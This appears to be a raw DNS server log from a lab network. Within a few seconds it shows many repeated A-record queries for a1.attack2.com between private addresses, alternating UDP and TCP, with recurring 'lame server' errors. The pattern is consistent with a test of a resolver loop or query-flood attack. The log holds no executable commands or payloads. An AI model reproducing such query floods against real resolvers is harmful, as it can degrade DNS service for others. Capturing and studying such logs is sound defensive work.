12-Mar-2025 07:33:05.243 client @0x7f1314000cd0 172.16.114.11#57671 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:05.287 client @0x7f1268007640 172.16.114.11#35316 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:05.355 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:05.355 client @0x7f130c000cd0 172.16.114.11#53311 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:05.403 client @0x7f1268007640 172.16.114.11#35318 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:05.455 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:05.455 client @0x7f12980bf6d0 172.16.114.11#57468 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:05.503 client @0x7f1288007640 172.16.114.11#35330 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:05.571 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:05.571 client @0x7f1250000cd0 172.16.114.11#38414 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:05.615 client @0x7f1288007640 172.16.114.11#35332 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:05.679 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:05.683 client @0x7f134c000cd0 172.16.114.11#35438 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:05.727 client @0x7f1288007640 172.16.114.11#35342 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:05.791 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:05.791 client @0x7f1308000cd0 172.16.114.11#39454 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:05.819 client @0x7f1288007640 172.16.114.11#35344 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:05.875 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:05.875 client @0x7f1360000cd0 172.16.114.11#38300 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:05.907 client @0x7f1288007640 172.16.114.11#35358 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:05.971 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:05.971 client @0x7f1244007570 172.16.114.11#50259 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:06.019 client @0x7f12b4007640 172.16.114.11#35366 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:06.083 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:06.087 client @0x7f12cc000cd0 172.16.114.11#44453 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:06.127 client @0x7f12b4007640 172.16.114.11#35374 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:06.191 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:06.195 client @0x7f1300000cd0 172.16.114.11#54056 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:06.215 client @0x7f12b4007640 172.16.114.11#35382 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:06.279 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:06.279 client @0x7f1248000cd0 172.16.114.11#42886 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:06.323 client @0x7f12b4007640 172.16.114.11#35388 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:06.387 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:06.387 client @0x7f12e0000cd0 172.16.114.11#59256 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:06.411 client @0x7f12b4007640 172.16.114.11#35390 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:06.471 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:06.471 client @0x7f12c0000cd0 172.16.114.11#49109 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:06.503 client @0x7f12b4007640 172.16.114.11#35394 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:06.567 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:06.567 client @0x7f1360000cd0 172.16.114.11#37592 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:06.603 client @0x7f126c007640 172.16.114.11#35410 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:06.667 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:06.667 client @0x7f1264000cd0 172.16.114.11#33712 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:06.715 client @0x7f12b4007640 172.16.114.11#35426 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:06.779 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:06.783 client @0x7f12ac000cd0 172.16.114.11#39335 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:06.811 client @0x7f12b4007640 172.16.114.11#35434 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:06.875 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:06.875 client @0x7f1370000cd0 172.16.114.11#44900 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:06.919 client @0x7f12b4007640 172.16.114.11#35440 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:06.987 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:06.987 client @0x7f1264000cd0 172.16.114.11#42572 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:07.031 client @0x7f12b4007640 172.16.114.11#35448 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:07.095 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:07.099 client @0x7f1350000cd0 172.16.114.11#60470 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:07.119 client @0x7f12b4007640 172.16.114.11#35450 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:07.183 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:07.187 client @0x7f1268000cd0 172.16.114.11#39632 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:07.231 client @0x7f1268011f60 172.16.114.11#35452 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:07.283 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:07.283 client @0x7f12cc000cd0 172.16.114.11#49929 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:07.331 client @0x7f12b4007640 172.16.114.11#35468 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:07.395 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:07.399 client @0x7f1364000cd0 172.16.114.11#55548 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:07.423 client @0x7f12b4007640 172.16.114.11#35480 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:07.491 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:07.491 client @0x7f1248000cd0 172.16.114.11#33025 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:07.535 client @0x7f12b4007640 172.16.114.11#35490 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:07.603 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:07.603 client @0x7f1368000cd0 172.16.114.11#56368 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:07.647 client @0x7f12b4007640 172.16.114.11#35504 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:07.711 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:07.715 client @0x7f12d4000cd0 172.16.114.11#48769 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:07.755 client @0x7f124000b920 172.16.114.11#35520 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:07.811 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:07.811 client @0x7f137c000cd0 172.16.114.11#51715 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:07.851 client @0x7f12b4007640 172.16.114.11#35530 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:07.915 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:07.919 client @0x7f1358000cd0 172.16.114.11#45962 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:07.963 client @0x7f12b4007640 172.16.114.11#35538 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:08.027 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:08.027 client @0x7f1374000cd0 172.16.114.11#51220 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:08.071 client @0x7f12b4007640 172.16.114.11#35540 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:08.135 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:08.139 client @0x7f129c000cd0 172.16.114.11#57022 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:08.171 client @0x7f12b4007640 172.16.114.11#35554 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:08.235 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:08.239 client @0x7f137c000cd0 172.16.114.11#60201 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:08.283 client @0x7f12b4007640 172.16.114.11#35564 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:08.351 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:08.351 client @0x7f1318000cd0 172.16.114.11#34645 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:08.395 client @0x7f1290007640 172.16.114.11#35570 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:08.451 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:08.451 client @0x7f12cc000cd0 172.16.114.11#35076 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:08.495 client @0x7f12b4007640 172.16.114.11#35582 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:08.559 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:08.563 client @0x7f1258000cd0 172.16.114.11#47084 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:08.583 client @0x7f12b4007640 172.16.114.11#35596 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:08.651 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:08.651 client @0x7f131c000cd0 172.16.114.11#52587 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:08.695 client @0x7f12b4007640 172.16.114.11#35610 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:08.759 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:08.759 client @0x7f12d4000cd0 172.16.114.11#58548 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:08.807 client @0x7f124000b920 172.16.114.11#35622 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:08.859 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:08.859 client @0x7f12cc000cd0 172.16.114.11#35830 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:08.907 client @0x7f12b4007640 172.16.114.11#35634 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:08.971 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:08.971 client @0x7f132c000cd0 172.16.114.11#58828 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:09.015 client @0x7f12b4007640 172.16.114.11#35636 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:09.079 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:09.083 client @0x7f1324000cd0 172.16.114.11#46112 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:09.123 client @0x7f1268011f60 172.16.114.11#35652 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:09.203 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:09.203 client @0x7f12a4000cd0 172.16.114.11#47529 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:09.235 client @0x7f1268011f60 172.16.114.11#35666 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:09.311 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:09.311 client @0x7f1334000cd0 172.16.114.11#53754 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:09.335 client @0x7f12b4007640 172.16.114.11#35670 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:09.343 client @0x7f12fc000cd0 172.16.0.1#37029 (a1.attack2.com): query: a1.attack2.com IN A +E(0)K (172.16.114.18)
12-Mar-2025 07:33:09.399 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:09.399 client @0x7f127c000cd0 172.16.114.11#45260 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:09.447 client @0x7f12b4007640 172.16.114.11#35686 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:09.515 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:09.515 client @0x7f1338000cd0 172.16.114.11#45176 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:09.547 client @0x7f12b4007640 172.16.114.11#35692 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:09.611 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:09.611 client @0x7f12ac000cd0 172.16.114.11#43576 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:09.659 client @0x7f12b4007640 172.16.114.11#35698 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:09.727 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:09.727 client @0x7f1334000cd0 172.16.114.11#58161 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:09.775 client @0x7f12b4007640 172.16.114.11#35702 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:09.839 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:09.839 client @0x7f1378000cd0 172.16.114.11#42433 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:09.883 client @0x7f12b4007640 172.16.114.11#35710 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:09.951 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:09.951 client @0x7f1278000cd0 172.16.114.11#47810 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:09.995 client @0x7f126c007640 172.16.114.11#35716 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:10.059 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:10.063 client @0x7f12ac000cd0 172.16.114.11#60310 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:10.107 client @0x7f12b4007640 172.16.114.11#35718 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:10.171 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:10.171 client @0x7f12e4000cd0 172.16.114.11#33015 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:10.195 client @0x7f12b4007640 172.16.114.11#35722 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:10.255 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:10.255 client @0x7f12c0000cd0 172.16.114.11#41924 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:10.279 client @0x7f12b4007640 172.16.114.11#35738 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:10.343 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:10.343 client @0x7f1280000cd0 172.16.114.11#40460 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:10.391 client @0x7f12b4007640 172.16.114.11#35744 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:10.455 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:10.459 client @0x7f1310000cd0 172.16.114.11#51524 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:10.479 client @0x7f12b4007640 172.16.114.11#35746 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:10.543 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:10.543 client @0x7f12d0000cd0 172.16.114.11#60445 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:10.587 client @0x7f12b4007640 172.16.114.11#35758 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:10.655 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:10.655 client @0x7f1244007570 172.16.114.11#43037 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:10.695 client @0x7f12b4007640 172.16.114.11#35770 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:10.771 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:10.771 client @0x7f1288000cd0 172.16.114.11#59358 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:10.819 client @0x7f1288019990 172.16.114.11#35776 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:10.871 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:10.871 client @0x7f12e80bf6d0 172.16.114.11#47598 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:10.919 client @0x7f1254007640 172.16.114.11#35778 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:10.983 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:10.983 client @0x7f125c000cd0 172.16.114.11#42350 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:11.027 client @0x7f126c007640 172.16.114.11#35782 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:11.095 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:11.095 client @0x7f12980bf6d0 172.16.114.11#38178 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:11.115 client @0x7f126c007640 172.16.114.11#35786 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:11.183 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:11.183 client @0x7f1348000cd0 172.16.114.11#41379 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:11.231 client @0x7f126c007640 172.16.114.11#35798 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:11.295 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:11.295 client @0x7f12f4000cd0 172.16.114.11#32829 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:11.339 client @0x7f1254007640 172.16.114.11#35802 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:11.403 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:11.407 client @0x7f1254000cd0 172.16.114.11#32805 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:11.435 client @0x7f126c007640 172.16.114.11#35810 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:11.503 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:11.507 client @0x7f12f0000cd0 172.16.114.11#48483 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:11.551 client @0x7f1284007640 172.16.114.11#35820 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:11.607 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:11.607 client @0x7f12bc000cd0 172.16.114.11#39903 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:11.631 client @0x7f126c007640 172.16.114.11#35826 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:11.699 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:11.699 client @0x7f12a0000cd0 172.16.114.11#56204 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:11.747 client @0x7f124000b920 172.16.114.11#35834 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:11.811 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:11.811 client @0x7f12d8004fb0 172.16.114.11#46791 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:11.843 client @0x7f124000b920 172.16.114.11#35840 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:11.911 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:11.911 client @0x7f12a0000cd0 172.16.114.11#40454 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:11.951 client @0x7f124000b920 172.16.114.11#35850 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:12.015 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:12.015 client @0x7f12dc000cd0 172.16.114.11#50806 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:12.047 client @0x7f124000b920 172.16.114.11#35862 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:12.111 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:12.111 client @0x7f1280000cd0 172.16.114.11#52862 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
